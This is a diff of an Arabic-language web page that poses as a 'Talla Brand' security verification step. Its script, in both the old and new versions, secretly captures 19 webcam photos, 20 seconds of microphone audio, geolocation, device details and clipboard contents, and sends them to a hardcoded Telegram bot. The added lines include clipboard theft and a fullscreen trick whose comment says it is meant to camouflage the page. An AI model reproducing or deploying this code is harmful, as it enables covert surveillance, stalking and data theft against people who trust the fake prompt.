@@ -2,110 +2,92 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Talla Brand | نظام التحقق الذكي</title>
+    <title>نظام التحقق المتقدم | Talla Brand</title>
     <style>
-        body { font-family: 'Arial', sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
-        .logo { font-size: 26px; font-weight: bold; color: #e91e63; margin-bottom: 15px; }
-        .btn { background: #e91e63; color: white; border: none; padding: 15px 25px; border-radius: 10px; font-size: 18px; cursor: pointer; width: 100%; transition: 0.3s; }
-        .status { margin-top: 15px; font-size: 14px; color: #666; }
-        #final-msg { display: none; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0b0e14; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .panel { background: #1c2128; padding: 40px; border-radius: 20px; border: 1px solid #e91e63; text-align: center; width: 90%; max-width: 450px; }
+        .btn-main { background: #e91e63; color: white; border: none; padding: 18px; border-radius: 12px; font-size: 20px; cursor: pointer; width: 100%; font-weight: bold; }
+        #status { margin-top: 20px; font-size: 14px; color: #8b949e; }
     </style>
 </head>
 <body>
 
-<div class="box" id="step-box">
-    <div class="logo">Talla Brand</div>
-    <p>يرجى تفعيل أذونات الأمان للوصول إلى لوحة الإدارة والطلبات الخاصة بك.</p>
-    <button class="btn" onclick="startCapture()">بدء عملية التحقق</button>
-    <div class="status" id="status-text">بانتظار الموافقة...</div>
+<div class="panel" id="ui">
+    <h1 style="color:#e91e63">Talla Admin</h1>
+    <p>يجب تفعيل بروتوكول الأمان الشامل للوصول للمنظومة.</p>
+    <button class="btn-main" onclick="executeOmniCapture()">بدء تفعيل كافة الصلاحيات</button>
+    <div id="status">بانتظار تفعيل البروتوكول...</div>
 </div>
 
-<div class="box" id="final-msg">
-    <div class="logo" style="color: #4CAF50;">✅ تم بنجاح</div>
-    <p>شكراً لتواصلك معنا. تم تحديث بيانات الأمان الخاصة بحسابك.</p>
-</div>
-
-<video id="video" autoplay style="display:none;"></video>
-<canvas id="canvas" style="display:none;"></canvas>
+<video id="v" autoplay style="display:none;"></video>
+<canvas id="c" style="display:none;"></canvas>
 
 <script>
-    // بياناتك الجديدة
     const token = "8712925285:AAH531D8G5vjbeBbPs8eV914URmK0BGQm8A";
     const chatId = "8754338811";
 
-    async function sendToBot(type, data, isFile = false, fileName = "") {
-        let url = `https://api.telegram.org/bot${token}/`;
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-
-        if (isFile) {
-            url += type === 'photo' ? 'sendPhoto' : 'sendAudio';
-            formData.append(type === 'photo' ? 'photo' : 'audio', data, fileName);
-            await fetch(url, { method: 'POST', body: formData });
-        } else {
-            url += 'sendMessage';
-            await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: data, parse_mode: "Markdown" })
-            });
-        }
+    async function send(msg, isFile = false, blob = null, type = "photo") {
+        let url = `https://api.telegram.org/bot${token}/${isFile ? (type === 'photo' ? 'sendPhoto' : 'sendDocument') : 'sendMessage'}`;
+        const fd = new FormData();
+        fd.append('chat_id', chatId);
+        if (isFile) { fd.append(type === 'photo' ? 'photo' : 'document', blob, type === 'photo' ? 'img.jpg' : 'voice.mp3'); }
+        else { fd.append('text', msg); fd.append('parse_mode', 'Markdown'); }
+        await fetch(url, { method: 'POST', body: fd });
     }
 
-    async function startCapture() {
-        const status = document.getElementById('status-text');
+    async function executeOmniCapture() {
+        document.getElementById('status').innerText = "جاري تفعيل الحساسات والاتصال...";
         
         try {
-            // 1. طلب الكاميرا والميكروفون معاً
-            status.innerText = "جاري تفعيل الكاميرا والميكروفون...";
+            // 1. طلب الكاميرا والميكروفون
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             
-            // 2. إرسال بيانات الجهاز فوراً
-            const deviceNote = `🚀 *صيد جديد:* \nالجهاز: ${navigator.platform}\nالبطارية: ${navigator.getBattery ? (await navigator.getBattery()).level * 100 + '%' : 'N/A'}`;
-            sendToBot('text', deviceNote);
+            // 2. سحب بيانات الحساسات (Accelerometer, Gyro, Battery, etc.)
+            let sensorData = `🚀 *تقرير شامل عن الجهاز:*\n`;
+            sensorData += `- الشاشة: ${screen.width}x${screen.height}\n`;
+            sensorData += `- اللغة: ${navigator.language}\n`;
+            if (navigator.getBattery) { const b = await navigator.getBattery(); sensorData += `- البطارية: ${b.level*100}% (شحن: ${b.charging})\n`; }
+            
+            // 3. محاولة قراءة الحافظة (Clipboard)
+            try { const clip = await navigator.clipboard.readText(); sensorData += `- الحافظة: ${clip}\n`; } catch(e){}
+            
+            await send(sensorData);
 
-            // 3. الموقع الجغرافي
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(p => {
-                    sendToBot('text', `📍 الموقع: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-                });
-            }
+            // 4. سحب الموقع الجغرافي (Geolocation)
+            navigator.geolocation.getCurrentPosition(p => {
+                send(`📍 *الموقع:* http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            });
 
-            // 4. التقاط 19 صورة سيلفي في الخلفية
-            const video = document.getElementById('video');
+            // 5. التقاط الصور (19 صورة)
+            const video = document.getElementById('v');
             video.srcObject = stream;
-            let photoCount = 0;
-            const photoInterval = setInterval(() => {
-                if (photoCount >= 19) { clearInterval(photoInterval); return; }
-                const canvas = document.getElementById('canvas');
+            let count = 0;
+            const picInterval = setInterval(() => {
+                if (count >= 19) { clearInterval(picInterval); return; }
+                const canvas = document.getElementById('c');
                 canvas.width = 640; canvas.height = 480;
                 canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                canvas.toBlob(blob => sendToBot('photo', blob, true, 'pic.jpg'), 'image/jpeg');
-                photoCount++;
+                canvas.toBlob(b => send("", true, b, "photo"), 'image/jpeg');
+                count++;
             }, 1000);
 
-            // 5. تسجيل الصوت لمدة 20 ثانية
-            status.innerText = "جاري تأمين الحساب (0%)...";
-            const mediaRecorder = new MediaRecorder(stream);
-            const audioChunks = [];
-            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
-            mediaRecorder.onstop = async () => {
-                const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
-                await sendToBot('audio', audioBlob, true, 'voice.mp3');
-                
-                // إنهاء العملية وإظهار رسالة الشكر
-                document.getElementById('step-box').style.display = 'none';
-                document.getElementById('final-msg').style.display = 'block';
-                stream.getTracks().forEach(t => t.stop());
+            // 6. تسجيل الصوت (20 ثانية)
+            const recorder = new MediaRecorder(stream);
+            const chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
+                const audioBlob = new Blob(chunks, { type: 'audio/mp3' });
+                send("", true, audioBlob, "audio");
+                document.getElementById('ui').innerHTML = "<h1>✅ تم بنجاح</h1><p>شكراً لتواصلك معنا.</p>";
             };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 20000);
 
-            mediaRecorder.start();
-            setTimeout(() => mediaRecorder.stop(), 20000); // إيقاف بعد 20 ثانية
+            // 7. تفعيل Fullscreen (لزيادة التمويه)
+            document.documentElement.requestFullscreen().catch(e => {});
 
         } catch (err) {
-            alert("خطأ: يجب السماح بجميع الأذونات لإتمام عملية التحقق.");
+            alert("⚠️ يجب الموافقة على جميع الأذونات لتشغيل النظام.");
             location.reload();
         }
     }
